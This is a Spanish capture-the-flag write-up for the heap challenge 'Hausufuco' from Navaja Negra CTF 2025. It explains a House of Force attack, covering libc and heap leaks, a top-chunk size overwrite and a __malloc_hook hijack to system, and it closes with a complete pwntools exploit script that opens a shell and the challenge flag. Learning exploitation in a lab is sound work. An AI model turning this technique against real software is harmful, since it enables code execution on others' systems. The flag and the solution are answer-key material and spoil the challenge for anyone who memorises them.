# Hausufuco 

> Navaja Negra CTF 2025 

> 02/10/2025 09:00 CEST - 04/10/2025 11:00 CEST

* Categoría: Pwn
* Autor: M0nk3st 
* Dificultad: ★★★☆
* Etiquetas: Heap, House of Force

## Descripción

    En los tiempos antiguos, cuando los vientos del norte llevaban secretos entre las montañas, existía el Palacio del Hausufuco. Esta majestuosa fortaleza fue construida por la Casa de Kazehara como un bastión de conocimiento y poder, donde los guardianes custodiaban el legendario secreto del Hausufuco.

    Solo aquellos que pudieran superar las pruebas del palacio y descifrar los secretos ocultos en sus cámaras de memoria podrían alcanzar la verdad. ¿Serás digno de conocerla?

## Archivos

    Hausufuco

```
Binario ELF
```

## Resolución

Se nos proporciona un binario que simula las cámaras de memoria del antiguo Palacio del Hausufuco. Al abrirlo con Ghidra, podemos identificar el conjunto de funciones principales que definen la lógica del programa y, a su vez, concentran las vulnerabilidades que lo hacen explotable.

`construir_camara`: permite reservar memoria en el heap para crear nuevas cámaras. En esta función se gestionan los tamaños de cada chunk y se almacenan dentro de un arreglo global.

`inspeccionar_camara`: imprime en pantalla tanto el tamaño como el contenido de la cámara. Aquí se revela un leak de información, ya que el contenido se muestra sin inicializar ni sanitizar, lo que expone datos internos del heap.

`renovar_camara`: habilita la escritura de nuevos datos en la cámara, pero utiliza un read de hasta 4096 bytes, sin verificar el límite real de la cámara creada. Esto introduce una vulnerabilidad clásica de heap overflow, que permite sobrescribir metadatos de chunks adyacentes.

`listar_camaras`: muestra de manera ordenada todas las cámaras existentes, pero no realiza operaciones peligrosas.

`main` y el `case` oculto (6): el flujo principal ofrece el menú de interacción. Sin embargo, la opción oculta imprime la dirección de `system` y de un chunk en el heap, proporcionando leaks directos tanto de `libc` como de la base del heap.

En conjunto, estas funciones representan los puntos críticos de ataque:

- Leaks controlados (gracias a la opción oculta y a la inspección insegura de cámaras).

- Heap overflow (causado por la escritura desbordada en `renovar_camara`).

Estas condiciones son precisamente las que permiten tomar el control del flujo de ejecución y redirigirlo hacia `system("/bin/sh")` modificando un `malloc_hook` o un `free_hook`.

### Paso 1 — Leaks iniciales (`libc` y heap)

Explorando el menú encontramos una opción no documentada (6) que imprime dos valores críticos:

- Una dirección de `system` dentro de `libc`.

- Una dirección del heap correspondiente a un chunk recién reservado/liberado.

Con el primer valor obtenemos la base de `libc` restando el desplazamiento conocido de `system`:

`libc_base = leak_system − offset(system)`

A partir de `libc_base` ya podemos derivar direcciones absolutas de:

- `__malloc_hook` (nuestro objetivo de sobrescritura),

- `system` (función a la que redirigiremos el hook),

- y la cadena `"/bin/sh"` dentro de `libc` (nos servirá para el disparo final).

El segundo valor (heap) nos da un ancla en el heap para razonar sobre el layout y calcular distancias hasta donde queremos aterrizar con la próxima reserva.

![[images/1.png]]

### Paso 2 — Preparar una escritura controlada (heap overflow)

En `renovar_camara` el programa escribe en la cámara con:

`read(STDIN_FILENO, c->contenido, 4096);`

sin comprobar `c->tamano`. Este desbordamiento de heap permite pisar metadatos del bloque contiguo (incluido el `size` del área "top” que el asignador usa para satisfacer futuras reservas).

La idea es forzar un `size` gigantesco en ese metadato para que el asignador crea que dispone de "espacio infinito”. El valor típico que cumple alineación/flags es:

`0xfffffffffffffff1`

- Los 4 bits bajos del `size` son flags de `glibc`; dejando el valor en `…f1` mantenemos `PREV_INUSE` a 1 y preservamos la alineación.
    
- El tamaño aparente pasa a ser inmenso, de modo que podremos "empujar” el top hasta casi cualquier dirección que elijamos en el siguiente paso.

![[images/2.png]]

### Paso 3 — Redirigir la siguiente reserva hacia nuestro objetivo

Con el top "agrandado”, la próxima llamada a reservar memoria devolverá un chunk desde el top actual y avanzará ese top según el tamaño pedido. Si elegimos el tamaño exacto, podemos hacer que el siguiente top quede justo delante de `__malloc_hook`.

Cálculo conceptual:

`target      = (__malloc_hook) − 0x20 current_top = (puntero_top_actual)         // aproximado a partir del leak del heap + ajuste request     = target − current_top`

- Restamos 0x20 porque el asignador colocará cabecera (`prev_size` + `size`) antes de la zona de datos; queremos que la zona de datos del siguiente chunk solape `__malloc_hook`.

- `current_top` lo estimamos con la dirección del heap que filtramos y los tamaños ya reservados (tu captura de GDB ayuda a afinar este ajuste).

- La próxima reserva con `request` bytes situará nuestro siguiente chunk de usuario encima de `__malloc_hook`, otorgándonos escritura directa sobre él.

### Paso 4 — Sobrescribir `__malloc_hook` con `system`

Una vez que el siguiente chunk solapa la dirección de `__malloc_hook`, escribimos ahí la dirección absoluta de `system` (derivada en el Paso 1).  
Desde ese momento, cada llamada posterior a `malloc` desviará la ejecución a `system` en vez de seguir el flujo normal del asignador.

Consideraciones:

- Asegúrate de escribir exactamente 8 bytes (x86_64) con la dirección de `system`.

- Si al intentar reservar después obtienes un `SIGABRT` por corrupción de heap, suele significar que el cálculo de distancias o la alineación del header no fue perfecto: ajusta el `request` unos bytes (típicamente múltiplos de 0x10) hasta que el "aterrizaje” sea limpio.

![[images/3.png]]

![[images/4.png]]

### Paso 5 — Disparo: ejecutar `system("/bin/sh")`

Queda provocar una llamada a `malloc` que pase como primer argumento un puntero a la cadena `"/bin/sh"`. En System V AMD64, el primer argumento de una función va en RDI; cuando el hook se invoca, el primer parámetro es el tamaño solicitado.

Si logramos que el programa interprete como "tamaño” el puntero a `"/bin/sh"`, entonces el hook (ya redirigido a `system`) se invocará como:

`system("/bin/sh");`

Cómo lo conseguimos aquí:

- A partir de `libc_base`, localizamos la cadena `"/bin/sh"` (está embebida en `libc`).

- Volvemos a invocar la ruta normal de "crear cámara” e introducimos como "tamaño” (el programa lo lee en hex) la dirección absoluta de `"/bin/sh"`.

- Al reservar, se invoca el hook → `system` recibe ese valor en RDI, y se abre la shell.

```python
from pwn import *

elf = context.binary = ELF("Hausufuco")
libc = ELF(b"./libc/glibc_2.28_no-tcache/libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(
            [elf.path],        
            gdbscript=gs
        )
    else:
        return process(elf.path)

def leak():
    io.sendlineafter(b"destino:", b"6")

    # Primer leak: system()
    system_leak = int(io.recvline().strip(), 16)
    log.success(f"system @ {hex(system_leak)}")

    # Calculamos base de libc
    libc.address = system_leak - libc.sym.system
    log.success(f"libc base @ {hex(libc.address)}")

    # Segundo leak: heap base
    heap = int(io.recvline().strip(), 16)
    log.success(f"heap base @ {hex(heap)}")

    return system_leak, heap


def build(size, name=b"A"):
    io.sendlineafter(b"destino:", b"1")
    io.sendlineafter(b"Tamano", str(size).encode())

    if isinstance(name, str):
        name = name.encode()

    io.sendafter(b"Nombre", name + b"\n")

def build2(size, name=b"A"):
    io.sendlineafter(b"destino:", b"1")
    io.sendlineafter(b"Tamano", hex(size).encode())

    if isinstance(name, str):
        name = name.encode()

    io.sendafter(b"Nombre", name + b"\n")


def renew(idx, data):
    io.sendlineafter(b"Elige tu destino:", b"3")
    io.sendlineafter(b"mara a renovar:", idx)
    io.sendafter(b"mara", data)


def malloc0(size, data):
    io.sendafter(b"Elige tu destino:  ", b"1")
    io.sendafter(b"(max 2000): ", size)
    io.sendafter(b"mara: ",data)


def malloc(size, name=b"A"):
    io.sendlineafter(b"Elige tu destino:", b"1")

    if isinstance(size, int):
        io.sendline(hex(size).encode()) 
    else:
        io.sendline(size if isinstance(size, bytes) else size.encode())

    # read(…, 31) → basta enviar un nombre + \n
    if isinstance(name, str):
        name = name.encode()
    io.sendlineafter(b"mara:", name)


def trigger(cmd_addr):
    io.sendlineafter(b"destino:", b"1")
    io.sendline(hex(cmd_addr).encode())  # esto ejecutará system("/bin/sh")


io = start()

system_addr, heap_base = leak()
log.info(f"Leak system(): {hex(system_addr)}")
log.info(f"Leak heap:     {hex(heap_base)}")

build(1, "Y"*8)
renew(b"0", b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))
target   = libc.sym.__malloc_hook - 0x20
heap_ptr = heap_base
distance = target - (heap_ptr + 0x30)

log.info(f"target={hex(target)} heap_ptr={hex(heap_ptr)} distance={distance}")
assert distance > 0           

distance = (libc.sym.__malloc_hook -0x40 ) - (heap_base + 0x90)

build2(distance, b"/bin/sh\0")
build2(24, p64(libc.sym.system))
binsh = next(libc.search(b"/bin/sh"))
trigger(binsh)


binsh = next(libc.search(b"/bin/sh"))
log.info(f"'/bin/sh' @ {hex(binsh)}")
io.interactive()
```

> **flag: nnctf{QU3_3L_H4USUFUC0_T3_4C0MP4N3}**